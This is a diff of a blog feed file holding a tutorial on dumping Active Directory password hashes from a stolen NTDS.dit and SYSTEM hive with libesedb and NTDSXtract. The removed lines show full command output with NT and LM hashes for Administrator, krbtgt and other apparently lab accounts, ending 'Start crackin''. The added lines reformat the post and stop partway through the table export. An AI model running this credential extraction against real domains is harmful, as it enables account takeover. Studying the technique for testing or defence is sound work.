@@ -19,266 +19,265 @@
       <description>&lt;p&gt;Part 2, we have the NTDS.dit file and the SYSTEM.hive file. First we need a few tools:&lt;/p&gt;
 &lt;p&gt;From: &lt;a href=&#34;http://www.ntdsxtract.com/&#34;&gt;http://www.ntdsxtract.com/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Download: &lt;a href=&#34;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&#34;&gt;http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From: &lt;a href=&#34;http://code.google.com/p/libesedb/&#34;&gt;http://code.google.com/p/libesedb/&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From: &lt;a href=&#34;http://code.google.com/p/libesedb/&#34;&gt;http://code.google.com/p/libesedb/&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Download: &lt;a href=&#34;https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz&#34;&gt;https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz&lt;/a&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Extract the tools:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tar zxvf libesedb-alpha-20120102.tar.gz
-unzip ntdsxtract_v1_0.zip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compile/make libesedb:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog/# cd libesedb-20120102
-root@wpad:~/blog/libesedb-20120102# ./configure 
-root@wpad:~/blog/libesedb-20120102# make
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Export the tables from NTDS.dit:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog/libesedb-20120102# cd esedbtools/
-root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport 
-esedbexport &lt;span style=&#34;color:#ae81ff&#34;&gt;20120102&lt;/span&gt;
-    
-Missing source file.
-Use esedbexport to export items stored in an Extensible Storage Engine &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ESE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-Database &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;EDB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; file
-
-Usage: esedbexport &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -c codepage &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -l logfile &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -m mode &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -t target &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -T table_name &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -hvV &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; source
-
-	source: the source file
-
-	-c:     codepage of ASCII strings, options: ascii, windows-874,
-	        windows-932, windows-936, windows-1250, windows-1251,
-	        windows-1252 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, windows-1253, windows-1254
-	        windows-1255, windows-1256, windows-1257 or windows-1258
-	-h:     shows this help
-	-l:     logs information about the exported items
-	-m:     export mode, option: all, tables &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
-	        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;all&amp;#39;&lt;/span&gt; exports all the tables or a single specified table with indexes,
-	        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tables&amp;#39;&lt;/span&gt; exports all the tables or a single specified table
-	-t:     specify the basename of the target directory to export to
-	        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is the source filename&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; esedbexport will add the suffix
-	        .export to the basename
-	-T:     exports only a specific table
-	-v:     verbose output to stderr
-	-V:     print version
-root@wpad:~/blog/libesedb-20120102/esedbtools# 
-
-
-root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport ../../ntds.dit 
-esedbexport &lt;span style=&#34;color:#ae81ff&#34;&gt;20120102&lt;/span&gt;
-
-Opening file.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysObjects&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysObjectsShadow&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysUnicodeFixupVer2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datatable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;hiddentable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;link_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sdpropcounttable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sdproptable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sd_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysDefrag2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;quota_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;quota_rebuild_progress_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
-Export completed.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Move the exported tables to somewhere a bit easier:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
-root@wpad:~/blog/libesedb-20120102/esedbtools# mv ntds.dit.export/ ../../
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NTDS extract can do a lot more than just hashes:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog# cd NTDSXtract 1.0/
-root@wpad:~/blog/NTDSXtract 1.0# ls
-dscomputers.py  dsdeletedobjects.py  dsfileinformation.py  dsgroups.py  dstimeline.py  dsusers.py  framework  ntds
-root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py 
-DSUsers
-Extracts information related to user objects
-
-usage: dsusers.py   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;option&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-  options:
-    --rid 
-          List user identified by RID
-    --name 
-          List user identified by Name
-    --passwordhashes 
-          Extract password hashes
-    --passwordhistory 
-          Extract password history
-    --certificates
-          Extract certificates
-    --supplcreds 
-          Extract kerberos keys
-    --membership
-          List groups of which the user is a member
-root@wpad:~/blog/NTDSXtract 1.0# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But we like hashes:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive 
-Running with options:
-	Extracting password hashes
-	Extracting password history
-Initialising engine...
-Scanning database - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3475&lt;/span&gt; records processed
-Extracting schema information - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1549&lt;/span&gt; records processed
-Extracting object links...
-
-List of users:
-&lt;span style=&#34;color:#f92672&#34;&gt;==============&lt;/span&gt;
-
-Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3562&lt;/span&gt;
-User name:           Administrator
-User principal name: 
-SAM Account name:    Administrator
-SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-GUID: 7ceee337-fa58-4ca0-9643-540a40161020
-SID:  S-1-5-21-3825330677-773554443-1603823854-500
-When created:         2012-08-22 03:12:59
-When changed:         2013-05-15 04:06:55
-Account expires:      Never
-Password last set:    2012-08-22 02:49:42.899576
-Last logon:           2013-05-15 04:08:04.547236
-Last logon timestamp: 2013-05-15 04:06:55.577353
-Bad password time     2013-06-07 02:34:34.560516
-Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
-Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-User Account Control:
-	NORMAL_ACCOUNT
-Ancestors:
-	$ROOT_OBJECT$ net projectmentor Users Administrator 
-Password hashes:
-	Administrator:$NT$88e4d9fabaecf3ded18dd80905521b29:::
-Password history:
-
-Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3563&lt;/span&gt;
-User name:           Guest
-User principal name: 
-SAM Account name:    Guest
-SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-GUID: 659723d7-1246-4959-b0fc-af80ea5e3816
-SID:  S-1-5-21-3825330677-773554443-1603823854-501
-When created:         2012-08-22 03:12:59
-When changed:         2013-03-14 06:54:22
-Account expires:      Never
-Password last set:    2013-03-14 06:54:22.029303
-Last logon:           2013-03-14 06:54:27.012817
-Last logon timestamp: 2013-03-14 06:32:41.834022
-Bad password time     2013-06-07 03:07:46.499917
-Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
-User Account Control:
-	PWD Not Required
-	NORMAL_ACCOUNT
-	PWD Never Expires
-Ancestors:
-	$ROOT_OBJECT$ net projectmentor Users Guest 
-Password hashes:
-	Guest:$NT$823893adfad2ada6e1a414f3ebdf58f7:::
-Password history:
-
-Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3564&lt;/span&gt;
-User name:           user
-User principal name: 
-SAM Account name:    user
-SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-GUID: c5a5c87a-93b4-4d80-97a1-1c605b9b0c03
-SID:  S-1-5-21-3825330677-773554443-1603823854-1000
-When created:         2012-08-22 03:12:59
-When changed:         2013-06-07 02:51:54
-Account expires:      Never
-Password last set:    2013-03-14 03:25:11.793912
-Last logon:           2013-06-07 02:51:54.152191
-Last logon timestamp: 2013-06-07 02:51:54.152191
-Bad password time     2013-04-19 05:25:40.412670
-Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;
-Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-User Account Control:
-	NORMAL_ACCOUNT
-	PWD Never Expires
-Ancestors:
-	$ROOT_OBJECT$ net projectmentor Users user 
-Password hashes:
-	user:$NT$88e4d9fabaecf3dec18dd80905521b29:::
-Password history:
-	user_nthistory0:$NT$88e4d9fabafcf3dec18dd80905521b29:::
-	user_nthistory1:$NT$0c61031f010b2fbb88fe449fbf262477:::
-	user_nthistory2:$NT$88e4dffabaecf3dec18dd80905521b29:::
-	user_lmhistory0:c869027e01c3c4fe7626a90c87cc7fed:::
-	user_lmhistory1:8be023cd858da1edd21b94907afe182c:::
-
-Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3610&lt;/span&gt;
-User name:           krbtgt
-User principal name: 
-SAM Account name:    krbtgt
-SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-GUID: 74e6bd0b-e4d5-42df-98d5-24f9060061c9
-SID:  S-1-5-21-3825330677-773554443-1603823854-502
-When created:         2012-08-22 03:16:03
-When changed:         2012-08-22 03:31:13
-Account expires:      Never
-Password last set:    2012-08-22 03:16:03.166457
-Last logon:           Never
-Last logon timestamp: Never
-Bad password time     Never
-Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-User Account Control:
-	Disabled
-	NORMAL_ACCOUNT
-Ancestors:
-	$ROOT_OBJECT$ net projectmentor Users krbtgt 
-Password hashes:
-	krbtgt:$NT$7253e8647254716b507a2dcb149ff2da:::
-Password history:
-	krbtgt_nthistory0:$NT$7253e86a7254716a507a2dcb149ff2da:::
-	krbtgt_lmhistory0:113926e06a31d182623633041b632929:::
-
-Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3762&lt;/span&gt;
-User name:           John Doe
-User principal name: jdoe@projectmentor.net
-SAM Account name:    jdoe
-SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-GUID: bbf24c63-39a9-4cc4-8aa8-933f9ddee940
-SID:  S-1-5-21-3825330677-773554443-1603823854-1104
-When created:         2012-08-22 04:10:52
-When changed:         2013-06-05 13:04:11
-Account expires:      Never
-Password last set:    2013-04-19 07:11:49.849592
-Last logon:           2013-06-07 02:56:25.677855
-Last logon timestamp: 2013-06-05 13:04:11.674344
-Bad password time     2013-05-02 03:01:12.536251
-Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;242&lt;/span&gt;
-Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-User Account Control:
-	NORMAL_ACCOUNT
-	PWD Never Expires
-Ancestors:
-	$ROOT_OBJECT$ net projectmentor Users John Doe 
-Password hashes:
-	John Doe:$NT$88e4d9fabaecf3ded18dd80905511b29:::
-Password history:
-
-Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3797&lt;/span&gt;
-User name:           Random User
-User principal name: randy@projectmentor.net
-SAM Account name:    randy
-SAM Account type:    SAM_NORMAL_USER_ACCOUNT
-GUID: 2701eb29-628a-4568-a093-d33a7db10d04
-SID:  S-1-5-21-3825330677-773554443-1603823854-1108
-When created:         2013-04-08 02:34:04
-When changed:         2013-05-27 16:06:07
-Account expires:      Never
-Password last set:    2013-04-19 06:59:25.423280
-Last logon:           2013-04-08 02:34:10.482690
-Last logon timestamp: 2013-04-08 02:34:10.482690
-Bad password time     Never
-Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
-Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
-User Account Control:
-	NORMAL_ACCOUNT
-	PWD Never Expires
-Ancestors:
-	$ROOT_OBJECT$ net projectmentor Users Random User 
-Password hashes:
-	Random User:$NT$88ead9fa5aecf3dec18dd80905521b29:::
-Password history:
-root@wpad:~/blog/NTDSXtract 1.0# 
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All done. Start crackin&#39;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://googledrive.com/host/0B3fBvzttpiiSN082cmxsbHB0anc/libesedb-alpha-20120102.tar.gz
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Extract the tools:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar zxvf libesedb-alpha-20120102.tar.gz
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unzip ntdsxtract_v1_0.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Compile/make libesedb:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/# cd libesedb-20120102
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102# ./configure 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102# make
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Export the tables from NTDS.dit:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102# cd esedbtools/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;esedbexport &lt;span style=&#34;color:#ae81ff&#34;&gt;20120102&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Missing source file.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Use esedbexport to export items stored in an Extensible Storage Engine &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ESE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Database &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;EDB&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; file
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Usage: esedbexport &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -c codepage &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -l logfile &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -m mode &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -t target &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -T table_name &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -hvV &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; source
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	source: the source file
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-c:     codepage of ASCII strings, options: ascii, windows-874,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        windows-932, windows-936, windows-1250, windows-1251,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        windows-1252 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, windows-1253, windows-1254
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        windows-1255, windows-1256, windows-1257 or windows-1258
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-h:     shows this help
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-l:     logs information about the exported items
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-m:     export mode, option: all, tables &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;all&amp;#39;&lt;/span&gt; exports all the tables or a single specified table with indexes,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tables&amp;#39;&lt;/span&gt; exports all the tables or a single specified table
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-t:     specify the basename of the target directory to export to
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default is the source filename&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; esedbexport will add the suffix
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        .export to the basename
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-T:     exports only a specific table
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-v:     verbose output to stderr
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	-V:     print version
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# ./esedbexport ../../ntds.dit 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;esedbexport &lt;span style=&#34;color:#ae81ff&#34;&gt;20120102&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Opening file.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysObjects&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysObjectsShadow&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
